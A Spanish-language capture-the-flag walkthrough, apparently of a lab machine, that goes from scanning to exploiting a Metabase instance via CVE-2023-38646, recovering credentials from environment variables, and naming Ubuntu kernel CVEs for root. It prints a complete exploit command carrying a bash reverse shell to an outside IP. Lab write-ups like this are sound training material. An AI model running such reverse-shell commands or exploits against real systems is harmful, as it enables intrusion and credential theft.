Hacemos ping a la máquina:

![[Pasted image 20240511115610.png]]

Tenemos conectividad y un ttl de 63 que es próximo a 64 por lo que es una máquina Linux.

Ahora hacemos el reconocimiento de puertos:

![[Pasted image 20240511115847.png]]

![[Pasted image 20240511115855.png]]

Y ahora hacemos un reconocimiento más exhaustivo:

![[Pasted image 20240511120010.png]]

![[Pasted image 20240511120037.png]]

Tenemos que pasar la IP a etc/hosts para poner la redirección y ya veremos la web correctamente.

![[Pasted image 20240511120211.png]]

Y ahora ya vemos la web

![[Pasted image 20240511120253.png]]

Esta es la web, donde vemos un login, pero antes de mirarlo vamos a ver el código fuente aunque no hay nada muy interesante.

Si vamos al login nos sale esto:

![[Pasted image 20240511120424.png]]

Vamos a meter el subdominio en etc/hosts y vemos la web.

![[Pasted image 20240511120853.png]]


Y ahora en la web vemos esto:

![[Pasted image 20240511120956.png]]

Vemos que el software es metabase, vamos a investigar sobre ello.


Y si buscamos, hay un fallo ( CVE-2023-38646 ), el cual nos permite ver un token, que mediante un script en python, podemos obtener una revshell.

Vamos a descargarnos el script.

Ya lo tenemos, y buscamos esta url: http://data.analytical.htb/api/session/properties

Añadiendo la parte de /api/session/properties, vemos la información que necesitamos. En este caso, necesitamos un token para poder acceder.

![[Pasted image 20240511121414.png]]

Aquí tenemos el token que necesitamos, y ahora tenemos que tener el código de la revshell que queremos que nos de, en mi caso me voy a poner en escucha en el puerto 443:

![[Pasted image 20240511121625.png]]

Ahora, existe una web que nos proporciona revshells en función de los parámetros que ponemos:

![[Pasted image 20240511121736.png]]

En este caso me ha creado esta y es la que vamos a usar, aunque en el github del CVE, añade la palabra bash en vez de sh.

```
python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'

```

Y lanzamos


![[Pasted image 20240511122211.png]]

Y ya hemos accedido a la máquina, ahora tratamos la bash.

![[Pasted image 20240511122721.png]]

Y ahora ya estamos dentro y podemos buscar información.

Ahora vemos cosas interesantes, como un .db, el cual seguramente contenga información para poder acceder por ssh.

Finalmente no es por ahí, si hacemos un env, con esto nos reportará información, y encontramos esto:
![[Pasted image 20240511124019.png]]
Y así podemos acceder, vamos a intentarlo por la web y por ssh.

![[Pasted image 20240511124107.png]]

![[Pasted image 20240511124117.png]]

Y hemos conseguido acceder y hemos conseguido la flag.

Ahora vamos escalar privilegios hasta root.

Si hacemos uname -a, vemos el tipo de ubuntu que tenemos:

![[Pasted image 20240511125914.png]]

Esta línea es la importante, ya que si buscamos en internet un exploit, nos sale una vulnerabilidad en la que ejecutando una línea somos root automáticamente:

![[Pasted image 20240511130001.png]]

Son los CVE :

- CVE-2023-2640
- CVE-2023-32629







